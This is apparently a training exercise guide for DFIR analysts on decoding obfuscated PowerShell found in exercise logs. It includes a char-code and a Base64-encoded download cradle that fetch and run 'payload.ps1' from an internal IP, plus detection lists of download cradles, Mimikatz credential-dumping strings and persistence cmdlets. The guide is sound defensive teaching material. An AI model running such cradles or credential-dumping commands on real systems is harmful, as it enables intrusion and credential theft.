# PowerShell Deobfuscation Guide
## Analyzing Obfuscated Commands in the Logs
**Exercise Author**: Andy Macready 
**Latest Update**: February 15, 2026  

---

## Overview

During this investigation, you will encounter **obfuscated PowerShell commands**. Real-world attackers frequently obfuscate their commands to evade detection and make analysis more difficult. As a DFIR analyst, you must be able to decode these commands to understand the true intent of the attacker.

---

## What You'll Find

In the PowerShell logs (especially `workstation01_powershell.log`), you'll see commands that look like this:

```powershell
-join([char[]]((40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,83,116,114,105,110,103,40,39,104,116,116,112,58,47,47,49,48,46,53,48,46,49,53,46,50,48,48,47,112,97,121,108,111,97,100,46,112,115,49,39,41)))
```

This is **NOT** human-readable at first glance. It requires decoding.

---

## Obfuscation Technique Used

This specific obfuscation uses **ASCII character codes**:
- Each number represents an ASCII character
- The `[char[]]` converts numbers to characters
- The `-join` concatenates them into a string

For example:
- `72` = H
- `101` = e
- `108` = l
- `108` = l
- `111` = o

Joined together: `Hello`

---

## Deobfuscation Methods

### Method 1: CyberChef (RECOMMENDED)

**CyberChef** is a web-based tool for analyzing and decoding data. It's perfect for this scenario.

**Steps:**

1. **Access CyberChef:**
   - Go to: https://gchq.github.io/CyberChef/
   - Or install locally: `npm install -g cyberchef`

2. **Extract the numbers:**
   - From the log, copy just the comma-separated numbers
   - Example: `40,78,101,119,45,79,98,106,101,99,116,...`

3. **Build the recipe:**
   - In CyberChef, add these operations:
     1. **"From Decimal"** with delimiter: **Comma**
     2. That's it!

4. **Paste the input:**
   - Paste the numbers into the input pane
   - The output will show the decoded command

**Example CyberChef Recipe:**
```
Input: 40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,83,116,114,105,110,103,40,39,104,116,116,112,58,47,47,49,48,46,53,48,46,49,53,46,50,48,48,47,112,97,121,108,111,97,100,46,112,115,49,39,41

Recipe:
1. From Decimal (Delimiter: Comma)

Output: (New-Object Net.WebClient).DownloadString('http://10.50.15.200/payload.ps1')
```

### Method 2: Python Script

If you prefer command-line tools:

```python
# decode_ps_charcode.py
import sys

# Input: comma-separated character codes
char_codes = sys.argv[1] if len(sys.argv) > 1 else input("Enter char codes: ")

# Split by comma and convert to characters
codes = [int(x.strip()) for x in char_codes.split(',')]
decoded = ''.join([chr(code) for code in codes])

print(f"Decoded: {decoded}")
```

**Usage:**
```bash
python3 decode_ps_charcode.py "40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41"
```

### Method 3: PowerShell Itself

You can also use PowerShell to decode PowerShell obfuscation:

```powershell
# Run this in PowerShell
$obfuscated = "40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,83,116,114,105,110,103,40,39,104,116,116,112,58,47,47,49,48,46,53,48,46,49,53,46,50,48,48,47,112,97,121,108,111,97,100,46,112,115,49,39,41"

# Convert to char array and join
-join([char[]]($obfuscated.Split(',') | ForEach-Object { [int]$_ }))
```

**WARNING:** In a real investigation, NEVER execute suspicious PowerShell commands directly! Use isolated VMs or static analysis only.

### Method 4: Online ASCII Converters

Many online tools can convert decimal ASCII to text:
- https://www.rapidtables.com/convert/number/ascii-to-text.html
- https://onlineasciitools.com/convert-ascii-to-text

Just ensure the delimiter is set to **comma**.

---

## Base64 Encoded Commands

You may also encounter Base64-encoded PowerShell commands in the logs. These appear as long strings of alphanumeric characters, like:

```
SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4ANQAwAC4AMQA1AC4AMgAwADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==
```

**Decoding Base64:**

**CyberChef:**
1. Recipe: **"From Base64"**
2. Then add: **"Decode text"** with encoding: **UTF-16LE** (Windows uses UTF-16)

**Command Line:**
```bash
echo "SQBFAFgAIAAoAE4AZQB..." | base64 -d | iconv -f UTF-16LE -t UTF-8
```

**PowerShell:**
```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("SQBFAFgAIAAo..."))
```

---

## Why Attackers Use Obfuscation

Understanding the "why" helps you anticipate what to look for:

1. **Evade Signature Detection:** AV and EDR tools scan for known malicious strings
2. **Bypass Command-Line Logging:** Basic logging might only capture the obfuscated version
3. **Slow Down Analysis:** Forces analysts to spend time decoding
4. **Hide True Intent:** Makes it harder for security teams to quickly assess risk

---

## Red Flags in Decoded Commands

After deobfuscation, look for these suspicious patterns:

### Download Cradles
```powershell
(New-Object Net.WebClient).DownloadString('http://...')
(New-Object Net.WebClient).DownloadFile('http://...', 'path')
Invoke-WebRequest -Uri 'http://...' -OutFile 'path'
wget http://... -O file
curl http://... -o file
```

### Command Execution
```powershell
Invoke-Expression (IEX)
Invoke-Command (ICM)
& (call operator)
. (dot-sourcing)
Start-Process
cmd /c
```

### Credential Dumping
```powershell
sekurlsa::logonpasswords
privilege::debug
lsadump::
Invoke-Mimikatz
```

### Lateral Movement
```powershell
Invoke-Command -ComputerName
Enter-PSSession
New-PSSession
WMI queries to remote systems
```

### Persistence
```powershell
New-Service
Set-Service
New-ScheduledTask
Set-ItemProperty HKLM:\...\Run
```

---

## Exercise Challenge

**Your Task:**
1. Find the obfuscated PowerShell command in `workstation01_powershell.log`
2. Use CyberChef to decode it
3. Identify what the decoded command does
4. Determine the malicious indicators (IOCs)

**Questions to Answer:**
- What URL does the command connect to?
- What file is being downloaded?
- What PowerShell cmdlets are being used?
- Why is this command suspicious?

---

## Tips for Real-World Analysis

1. **Always Decode, Never Execute:** Use static analysis tools, not live execution
2. **Document Your Process:** Keep notes on what you decoded and how
3. **Extract IOCs:** URLs, IPs, file paths, hashes from decoded commands
4. **Context Matters:** Correlate decoded commands with other log events
5. **Build a Toolbox:** Have CyberChef bookmarked, Python scripts ready
6. **Practice:** The more obfuscated commands you decode, the faster you'll get

---

## Additional Resources

### CyberChef Recipes
- **ASCII Decimal to Text:** From Decimal (delimiter: Comma)
- **Base64 Decode:** From Base64 → Decode text (UTF-16LE)
- **URL Decode:** URL Decode
- **Hex to Text:** From Hexdump → Magic (auto-detect)

### Reference Links
- CyberChef: https://gchq.github.io/CyberChef/
- ASCII Table: https://www.asciitable.com/
- PowerShell Obfuscation Research: https://github.com/danielbohannon/Invoke-Obfuscation

---

## Quick Reference Card

| Obfuscation Type | Detection String | CyberChef Recipe |
|------------------|------------------|------------------|
| Char Codes | `[char[]]((40,78,101...))` | From Decimal (Comma) |
| Base64 | `[Convert]::FromBase64String` | From Base64 → UTF-16LE |
| Hex | `0x48,0x65,0x6C,0x6C,0x6F` | From Hex (Comma) |
| String Concat | `'{0}{1}' -f 'New','-Object'` | Manual reconstruction |
| Reversed | `'gnirtS'[-1..-7] -join ''` | Reverse string |

---

**Good luck with your analysis! Remember: attackers make it hard on purpose. Your job is to be harder to fool than they are to obfuscate.**

---

**Created for:** CYBER-EX-2026-001  
**Last Updated:** February 6, 2026  
**Classification:** TRAINING MATERIAL
